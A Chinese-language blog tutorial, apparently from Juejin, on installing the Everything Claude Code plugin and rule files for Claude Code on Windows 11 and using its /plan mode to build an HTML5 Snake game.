h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在之前的教程中，我们成功在 Windows 11 环境下把 Anthropic 的“编程神器” <strong>Claude Code</strong> 跑了起来。相信很多朋友在体验过那种“这才是未来编程”的快感后，都跟我一样大受震撼。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a01bef3be37a436e9000e85e876d02d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=Q%2FGgJUFqUhlty6ptCPoDDF9pw1U%3D" alt="" loading="lazy"/></p>
<p>但是，随着我最近在高强度的开发实战（特别是用来写稍微复杂一点的 AI 智能体项目）中深入使用，我发现这位“天才程序员”也有它的软肋：</p>
<ol>
<li>
<p><strong>它是“金鱼记忆”</strong>：一旦对话变长，或者隔天再打开，它就忘了之前的项目架构和决策，你得费劲地重新把上下文“喂”给它。</p>
</li>
<li>
<p><strong>它是“随性派”</strong>：有时你得反复强调“请用 TypeScript”、“请遵循这个文件结构”，它才肯乖乖听话，非常消耗 Token 和耐心。</p>
</li>
<li>
<p><strong>它缺乏“工程直觉”</strong>：原生的 Claude Code 很强，但它更像是一个在大厂待过的“外包”，虽然活儿好，但不懂你的项目习惯。</p>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd8d41fa7c0a42fbb4d6652f461645f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=TEFEpiLRb9L9IczITwqgMvy%2FrPI%3D" alt="" loading="lazy"/></p>
<p><strong>这就引出了今天的主角 —— Everything Claude Code。</strong>
如果把 Claude Code 比作一把绝世好剑，那么 <strong>Everything Claude Code</strong> 就是那本失传已久的“剑谱”。这是目前 GitHub 上最火的 Claude Code 配置集合（由 Anthropic Hackathon 冠军 Affaan Mustafa 开发），它通过一系列巧妙的 <strong>Rules（规则）</strong>、<strong>Skills（技能）</strong> 和 <strong>Hooks（钩子）</strong>，彻底解决了上述痛点。
它能让你的 AI 助手学会“记笔记”（持久化记忆）、学会“自我反思”（代码审查），甚至能自动化生成文档。
<strong>开源链接</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faffaan-m%2Feverything-claude-code" target="_blank" title="https://github.com/affaan-m/everything-claude-code" ref="nofollow noopener noreferrer">github.com/affaan-m/ev…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a88eaceb474d4726a8e2dcc52c3523da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=zLH7HVrxrGGqIrs1H9kRIDarJo8%3D" alt="" loading="lazy"/></p>
<p>今天这篇进阶教程，我就手把手教大家：<strong>如何在 Windows 11 环境下，把这就套“最强配置”装进你的 Claude Code 里，把它从一个“聊天机器人”进化成一个真正懂你、有记忆、能干重活的“资深 AI 工程师”。</strong>
准备好了吗？我们要开始给 AI “做手术”了。</p>
<h2 data-id="heading-0">第一部分：环境准备与安装</h2>
<p>我们要做的不是安装一个新软件，而是要把一套“绝世武功秘籍”（配置文件）下载下来，然后“传授”（复制）给你的 Claude Code。</p>
<h3 data-id="heading-1">检查你的装备库 (环境自检)</h3>
<p>在开始之前，我们需要确保你的 Windows 11 已经准备好了基础工具。请打开你的 <strong>PowerShell</strong> 或 <strong>终端 (Windows Terminal)</strong>，依次输入以下命令：
<strong>A. 检查 Claude Code 是否存活</strong></p>
<pre><code class="hljs language-Markdown" lang="Markdown">claude --version
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d910323d9214eb7b6f219122c85a09e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=Ag4emVjUKqfqKhzFJiuPTIw4Nw4%3D" alt="" loading="lazy"/></p>
<p><strong>正常反馈</strong>：会出现类似 <code>2.x.x</code> 的版本号。
<strong>如果不正常</strong>：请回看我的之前那篇**<a href="https://link.juejin.cn?target=https%3A%2F%2Fmy.feishu.cn%2Fwiki%2FPFBJwgs5qioKL5kfAlOcuY8xnAe" target="_blank" title="https://my.feishu.cn/wiki/PFBJwgs5qioKL5kfAlOcuY8xnAe" ref="nofollow noopener noreferrer">《Claude Code 部署教程》</a>**，先把 Claude Code 装好。
<strong>B. 检查 Git 是否安装</strong></p>
<pre><code class="hljs language-Markdown" lang="Markdown">git --version
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/154d35310fd34653bc9dc392c8a5dbdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=Ki%2FsvLjVX68btnvILt6PaNLZCzg%3D" alt="" loading="lazy"/></p>
<p><strong>正常反馈</strong>：会出现 <code>git version 2.x.x...</code>。
<strong>如果不正常</strong>：去 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgit-scm.com%2Fdownload%2Fwin" target="_blank" title="https://git-scm.com/download/win" ref="nofollow noopener noreferrer">Git for Windows 官网</a> 下载安装。</p>
<h2 data-id="heading-2">第二部分：插件化极速部署</h2>
<p>在以前，给 Claude Code 装配置需要像搬砖一样手动复制一堆文件。但现在，我们可以利用 Claude Code 原生的<strong>插件市场（Plugin Marketplace）</strong> 功能，像给 Chrome 装插件一样简单。
整个过程只需 <strong>3 步</strong>，耗时约 <strong>2 分钟</strong>。</p>
<h3 data-id="heading-3">第一步：安装“Everything”插件核心</h3>
<p>打开你的终端（Terminal 或 PowerShell），不需要下载任何 ZIP 包，直接在终端里和 Claude 对话即可。
<strong>启动 Claude Code</strong>：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">claude
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94f942f63fc24bd4b0b0bdb1e1cce3da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=rP5m%2BTpkt0tkA1UHiRoUF2Egry0%3D" alt="" loading="lazy"/></p>
<p><strong>添加插件市场源</strong>： 在 Claude 的对话框中，直接输入以下命令并回车（这会告诉 Claude 去哪里找这个插件）：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">/plugin marketplace add affaan-m/everything-claude-code
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a7eeccc6c85470eb4707a5aaa9b1743~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=SyYcR88ZQ7swN1o42DhipcU26X0%3D" alt="" loading="lazy"/>
一键安装插件，接着输入：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">/plugin install everything-claude-code@everything-claude-code
</code></pre>
<p>输入安装命令并回车后，终端会出现一个交互式的选择界面（如下图所示）。这时候不要慌，这里需要你决定“把这些能力装在哪里”。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6850836bbd664e40888f59fb1126cb19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=MIR27DglUtSjP96Kf2NMpBdjVnw%3D" alt="" loading="lazy"/></p>
<p>你会看到三个选项，我们来逐一解读（保姆级解释）：</p>
<ol>
<li>
<p><strong><code>Install for you (user scope)</code></strong> <strong>【强烈推荐选这个！】</strong></p>
</li>
<li>
<p><strong>含义</strong>：安装到你当前用户的全局配置里。</p>
</li>
<li>
<p><strong>好处</strong>：一次安装，处处可用。无论你以后打开哪个文件夹、写哪个新项目，Claude Code 都会自带这些强大的技能和记忆。</p>
</li>
<li>
<p><strong>适合</strong>：个人开发者、独行侠、希望 AI 助手时刻保持最强状态的你。</p>
</li>
<li>
<p><code>Install for all collaborators on this repository (project scope)</code></p>
</li>
<li>
<p><strong>含义</strong>：只安装在当前这个项目文件夹里，并且把配置写入文件，推送到 Git 仓库。</p>
</li>
<li>
<p><strong>好处</strong>：你的队友拉取代码后，也能自动获得这些工具。</p>
</li>
<li>
<p><strong>适合</strong>：团队协作，且你希望强制队友也使用这套工作流。</p>
</li>
<li>
<p><code>Install for you, in this repo only (local scope)</code></p>
</li>
<li>
<p><strong>含义</strong>：只在这个项目里用，且不分享给队友。</p>
</li>
<li>
<p><strong>适合</strong>：你在秘密测试某个插件，不想影响全局环境。</p>
</li>
</ol>
<p><strong>📝 操作步骤：</strong></p>
<ol>
<li>
<p>确保光标停留在第一项 <strong><code>Install for you (user scope)</code></strong> 上（如果有变动，使用键盘上下箭头 <code>↑</code> <code>↓</code> 移动）。</p>
</li>
<li>
<p>直接按 <strong><code>Enter</code></strong> <strong>(回车键)</strong> 确认。</p>
</li>
</ol>
<p><strong>👀 重点注意：安装成功的标志</strong> 按下回车后，终端可能会出现两种情况：</p>
<ul>
<li>
<p><strong>情况 A（话痨模式）</strong>：刷屏显示 <code>Installed agent: xxx</code>, <code>Installed command: xxx</code> 等一长串列表。</p>
</li>
<li>
<p><strong>情况 B（高冷模式）</strong>：只显示一行 <code>(no content)</code> 或者什么都不显示，直接跳回输入框。</p>
</li>
</ul>
<p><strong>请注意：情况 B 也是成功的！</strong> 如果你不确定是否装好了，可以再次输入一遍安装命令，如果它提示 <code>Plugin ... is already installed</code>（如截图所示），那就说明你已经大功告成了，请放心继续下一步。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6feabb258843489c979e62ee3ef9d409~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=AKU8EoIw4m2AVnx4C3X%2Fxl4yyRM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">第二步：手动注入“大脑规则”（必做！）</h3>
<p>⚠️ <strong>注意：这是最关键的一步！</strong> 由于 Claude Code 目前的限制，插件无法自动修改你的系统规则（Rules）。如果不做这一步，Claude 只是学会了“技能”，但还没学会“纪律”和“思维方式”。
我们需要手动把规则文件放入 Claude 的配置目录。</p>
<ol>
<li><strong>找到你的 Claude 配置目录</strong></li>
</ol>
<ul>
<li>
<p><strong>Windows 用户</strong>：通常在 <code>C:\Users\你的用户名\.claude\rules</code></p>
</li>
<li>
<p><strong>macOS/Linux 用户</strong>：在 <code>~/.claude/rules</code></p>
</li>
</ul>
<ol start="2">
<li><strong>下载规则文件</strong> 如果你不想克隆整个仓库，我为你准备了<strong>最简单的“偷懒”方法</strong>： 你需要去 GitHub 仓库的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faffaan-m%2Feverything-claude-code%2Ftree%2Fmain%2Frules" target="_blank" title="https://github.com/affaan-m/everything-claude-code/tree/main/rules" ref="nofollow noopener noreferrer">rules 文件夹</a>，把里面的 <code>.md</code> 文件（如 <code>security.md</code>, <code>coding-style.md</code>, <code>testing.md</code> 等）下载下来。</li>
</ol>
<p><strong>推荐操作（命令行极客版）：</strong> 先退出 Claude（输入 <code>/exit</code>），然后在终端（Powershell）运行：</p>
<pre><code class="hljs language-Markdown" lang="Markdown"><span class="hljs-section"># 1. 克隆仓库到临时目录git clone https://github.com/affaan-m/everything-claude-code.git temp<span class="hljs-emphasis">_ecc# 2. 创建规则目录（如果不存在）mkdir -p ~/.claude/rules# 3. 复制规则文件过去cp temp_</span>ecc/rules/* ~/.claude/rules/# 4. (可选) 删除临时目录Remove-Item temp<span class="hljs-emphasis">_ecc -Recurse -Force
</span></span></code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d79fd4103d634e60b2fa9100ce27d430~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=FfSfHGAkjAsPCF8PQcAhQXhOuG0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">第三步：验证安装 &amp; 初始化包管理器</h3>
<p>一切就绪，我们来测试一下，顺便配置一下你常用的包管理器（npm, pnpm 等），这样 Claude 写代码时知道该用什么命令。
<strong>重启 Claude</strong>：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">claude
</code></pre>
<p><strong>运行初始化命令</strong>： 在对话框输入以下命令（Claude 可能会自动补全成长得像 <code>everything-claude-code:setup-pm</code> 的样子，不用管，直接回车）：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">/setup-pm
</code></pre>
<p><strong>授权执行脚本（重点！）</strong>： 回车后，你会看到类似下图的界面。Claude 会请求运行一个名为 <code>setup-package-manager.js</code> 的脚本。</p>
<ul>
<li>
<p><strong>不必惊慌</strong>：这是它在请求权限扫描你的环境。</p>
</li>
<li>
<p><strong>操作方法</strong>：看到 <code>Do you want to proceed?</code>（你想要继续吗？）时，默认选项是 <strong><code>&gt; 1. Yes</code></strong>。直接按 <strong><code>Enter</code></strong> <strong>(回车)</strong> 确认即可。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11c29f7a6a3144758a31410fc5f01b69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=%2BJ7fBOPgnDkHpWJlo0BwNyb5odQ%3D" alt="" loading="lazy"/></p>
<p><strong>再次确认（请耐心）</strong>： 紧接着，它可能会再次请求权限来“列出可用列表” (<code>--list</code>)。 <strong>请继续按回车选择</strong> <strong><code>Yes</code></strong>。这是一个正常的流程，不要拒绝它，否则初始化会中断。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7ed9492ddc147928bbf4d7703671915~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=zGN8NtGmD8lRG5A6sutJ9g5h04g%3D" alt="" loading="lazy"/></p>
<p><strong>做最终决定（Final Decision）</strong> 脚本跑完后，会弹出一个交互式菜单（如下图）。它会列出你电脑里已经装了哪些工具（表格里 <code>Installed: Yes</code> 的项）。</p>
<ul>
<li>
<p><strong>如果你是新手</strong>：直接选 <strong><code>1. Keep npm (current)</code></strong>（或者你电脑上默认已安装的那个）。这是最稳妥的选择。</p>
</li>
<li>
<p><strong>如果你是老手</strong>：想换成更快的 <code>pnpm</code> 或 <code>bun</code>，可以选对应的选项，Claude 会帮你去安装它。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44a0652e409745c290b722dad6f7c718~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=lR6Y4T2Ki5FsG3JtFX750WnWM9A%3D" alt="" loading="lazy"/></p>
<p><strong>最后的“画押”（写入配置）</strong> 选完工具后，Claude 会最后一次请求权限：<strong>创建一个名为</strong> <strong><code>package-manager.json</code></strong> <strong>的配置文件</strong>。 这一步是为了把你的选择“刻在硬盘里”，以后就不用再设置了。
<strong>操作方法</strong>：看到 <code>Create file</code> 的请求时，确认为 <strong><code>&gt; 1. Yes</code></strong>，按下 <strong>Enter (回车)</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7eac3d18d82b44d8ae489f9cf2e3dd1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=P70ToSujY2fm0FM9L4ZJwMRIKvM%3D" alt="" loading="lazy"/></p>
<p><strong>最终验证（Verify）</strong> 文件保存后，Claude 会<strong>最后再运行一次检测脚本</strong>，目的是确认刚才的配置真的生效了（Verify package manager configuration）。 <strong>操作方法</strong>：不要犹豫，再次选择 <strong><code>&gt; 1. Yes</code></strong> 并回车。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2cc3c9c335ba4618aeeefe8397dca400~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=J5LtYjVTins%2Bwxv3vEqg6BJ1%2Fz0%3D" alt="" loading="lazy"/></p>
<p><strong>见证胜利（配置完成）</strong> 在经过几次确认后，终端最终会显示一段详细的总结报告（如下图）。</p>
<ul>
<li>
<p><strong>Configuration</strong>: 显示你选了 <code>npm</code>。</p>
</li>
<li>
<p><strong>Commands</strong>: 显示以后它会用什么命令来干活。</p>
</li>
</ul>
<p>当你看到 <strong>"Done. Your package manager configuration is now set up"</strong> 这行字时，恭喜你！所有的环境配置工作全部结束！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0481829d010442368e16f6ca15fd2776~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=ow7w%2FxJK7uw9vEEIBXrkQ22yQ0s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">第三部分：实战演练</h2>
<p>环境装好了，不拿出来溜溜怎么行？
很多朋友以前用 Claude Code，上来就说：“给我写个贪吃蛇游戏”。结果 AI 经常是“哐当”扔给你一大坨代码，要么跑不起来，要么改一个 Bug 冒出三个新 Bug。
<strong>为什么？因为它没有“脑子”（规划）。</strong> 但装了 <strong>Everything Claude Code</strong> 之后，我们拥有了一个核心核武器：<strong><code>/plan</code></strong> <strong>命令</strong>。
现在，请跟着我做，我们来体验一下什么叫“<strong>降维打击</strong>”。</p>
<h3 data-id="heading-7"><strong>1.提出需求：不要直接写代码，先做计划</strong></h3>
<p>在终端里，输入以下命令（还是以经典的贪吃蛇游戏为例，因为它简单且直观）：</p>
<pre><code class="hljs language-Markdown" lang="Markdown">/plan "使用 HTML5 和原生 JavaScript 写一个贪吃蛇游戏，界面要现代简洁，支持分数记录"
</code></pre>
<p><strong>💡 小贴士</strong>：注意 <code>/plan</code> 和后面的需求之间有个空格。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4521ad2da07b45ed949fc59b8c85a320~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=%2BtjTtwOqKMr2e8ySKGWeh%2BDsULo%3D" alt="" loading="lazy"/></p>
<p>请看屏幕左下角那个蓝色的 <strong><code>[||] plan mode on</code></strong> 标志 —— 这意味着 Claude 已经从普通的“聊天模式”切换到了专业的“架构师模式（Plan Mode）”。
在当前版本的 Claude Code 中，<code>/plan</code> 命令有时只作为一个“模式开关”。它听到了你的召唤，打开了开关，但可能没有把你刚才引号里的那句话直接当成任务发出去（或者它正在等你确认）。</p>
<h4 data-id="heading-8"><strong>怎么办？（只需一步）</strong></h4>
<p>现在的光标 <code>&gt;</code> 已经在闪烁等待了，你只需要<strong>在当前模式下，把需求再发一遍</strong>即可：</p>
<ol>
<li>
<p><strong>直接输入</strong>： <code>使用 HTML5 和原生 JavaScript 写一个贪吃蛇游戏，界面要现代简洁，支持分数记录</code></p>
</li>
<li>
<p><strong>按下回车</strong>。</p>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da97def5c4134df4a23d21763c3427a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=ORVtgluy8WkIDpIG2%2Flq9ChkPcU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">2.见证“降维打击”级的规划能力</h3>
<p>按下回车后，Claude <strong>绝对不会</strong>像个愣头青一样直接开始写代码。相反，它会先停下来思考，然后输出一份<strong>极具专业水准的“项目设计书”</strong>。
请看下图，这就是 Everything Claude Code 的威力所在。它不仅理解了你的需求，还自动补全了所有细节：</p>
<ul>
<li>
<p><strong>文件结构</strong>：自动规划好了 <code>index.html</code> (骨架), <code>style.css</code> (皮肤), <code>game.js</code> (灵魂)。</p>
</li>
<li>
<p><strong>核心功能拆解</strong>：</p>
<ul>
<li>
<p>明确画布大小 (400x400)</p>
</li>
<li>
<p>操作逻辑 (WASD + 方向键双重支持)</p>
</li>
<li>
<p>数据存储 (利用 localStorage 存最高分，连这个细节都想到了！)</p>
</li>
</ul>
</li>
<li>
<p><strong>UI 设计规范</strong>：</p>
<ul>
<li>甚至连配色都想好了：深色背景 (<code>#1a1a2e</code>) 配霓虹绿蛇身 (<code>#00ff88</code>)。这哪是写代码，简直是自带设计师！</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2ad75288a1b429889c5c586a02b3643~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=%2FmsRdygb5HW2cCRFRdIWb9YuJcA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">3.架构师的“追问”：它竟然懂得抠细节！</h3>
<p>这真是一个超级大的<strong>惊喜点</strong>！
大多数 AI 编程工具（包括 ChatGPT 网页版）都是你发个指令，它就直接闷头写代码，根本不管细节。
但装了 <strong>Everything Claude Code</strong> 后，它竟然懂得了**“需求调研”<strong>（Interview Mode）。它发现你的需求里没说清楚“游戏难度/地图大小”，于是它</strong>主动停下来询问你的偏好**。
这简直就是<strong>从“外包工”进化成了“产品经理”</strong>！
我把这关键的一步补充进教程，作为**“第三部分：实战演练”<strong>的</strong>第 3 小节**（把原来的“步步为营”顺延为第 4 小节）。</p>
<ol>
<li>
<h5 data-id="heading-11"><strong>架构师的“追问”：它竟然懂得抠细节！</strong></h5>
</li>
</ol>
<p>在生成初步计划后，最让我震惊的一幕发生了。Claude 并没有急着去写代码，而是发现我的需求里有一个模糊点：<strong>地图大小和游戏节奏</strong>。
于是，它主动发起了一个“交互式问卷”（如下图）：</p>
<ul>
<li>
<p>它问我：<strong>“你偏好什么样的网格大小？”</strong></p>
</li>
<li>
<p>并且给出了专业的选项分析：</p>
<ul>
<li>
<p><strong>20x20 (推荐)</strong>：经典手感。</p>
</li>
<li>
<p><strong>15x15</strong>：地图小，节奏快（适合急性子）。</p>
</li>
<li>
<p><strong>25x25</strong>：地图大，难度高（适合高手）。</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fd1cdf0585d4f68a6b46e4e5f70cb1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=VxKlpwiD9KBQHAqJSFYX1ehlUIk%3D" alt="" loading="lazy"/></p>
<p><strong>📝 操作方法：</strong> 在这个界面，你可以用上下键选择，或者直接回车选择它推荐的 <strong><code>&gt; 1. 20x20 格子 (推荐)</code></strong>。
<strong>为什么要强调这一点？</strong> 这证明了 Everything Claude Code 的 <code>planner</code> 智能体具有<strong>批判性思维</strong>。它知道“模糊的需求”会导致“垃圾的代码”，所以它要在动工前把所有细节都敲定。这就是为什么用它写出来的程序 Bug 极少的原因。</p>
<h3 data-id="heading-12">4.交棒时刻：从“设计”到“施工”</h3>
<p>当你在屏幕上看到详细的 <strong>最终方案总结</strong>，并且 Claude 询问 <code>Exit plan mode?</code> 时，说明规划阶段完美结束。
<strong>确认退出</strong>： 直接选择 <strong><code>&gt; 1. Yes</code></strong> 并回车。
<strong>⚠️ 注意：</strong> 这里不需要你再输入“开始写代码”之类的指令。Claude 非常聪明，它知道你退出规划模式就是为了去执行。 一旦你按下回车，你会发现它<strong>立刻</strong>抛出了第一个文件的代码（通常是 <code>index.html</code>），并请求创建文件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b55ee0608db049fcb783da3c739f494e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=%2FgD1V%2FhAD2zRoHwR9FeqHyWwBN8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">5.关键技巧：如何“一键授权”所有文件？</h3>
<p>现在 Claude 已经把 <code>index.html</code> 的代码写好了（如下图所示），它停下来问你：</p>
<blockquote>
<p><strong>"Do you want to create index.html?"</strong></p>
</blockquote>
<p>这里有一个<strong>省时 90% 的老手技巧</strong>！
因为我们的贪吃蛇游戏有 3 个文件（HTML, CSS, JS），如果你选第一个选项 <code>Yes</code>，它每写一个文件都会停下来问你一次，非常啰嗦。
<strong>✅ 推荐操作：选择“全权委托”</strong> 请按下键盘的 <strong><code>Shift + Tab</code></strong> 键（或者用方向键下移），选中第二个选项： <strong><code>&gt; 2. Yes, allow all edits during this session</code></strong>
<strong>意思是：</strong> “好的，不仅这个文件可以写，接下来本次会话里所有的文件修改，我都授权给你，别再烦我了。”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/685ff6b1bdf44ca19e38d068fcd36652~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=Vc7eekvO2n1Pth21PSV8nqL7TSM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">6.见证成果</h3>
<p>当你授权后，你会看到屏幕上代码飞速滚动。几秒钟后，Claude 会告诉你所有文件都创建完毕。 这时候，你可以直接去你的项目文件夹里打开 <code>index.html</code>，一个只有 20KB 大小、界面现代、手感丝滑的贪吃蛇游戏就已经躺在那里了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86d834045fcb48cb8334b4ee134316b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=Uy3qW18talEpKTBXWxnWYU6jE9g%3D" alt="" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f203bebae4514d03931aa428331648e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5ZCM5a2mTGlubw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771560341&amp;x-signature=qHoy3OFdKBtAiaE%2BaDFnJ7XqSXo%3D" alt="" loading="lazy"/></p>
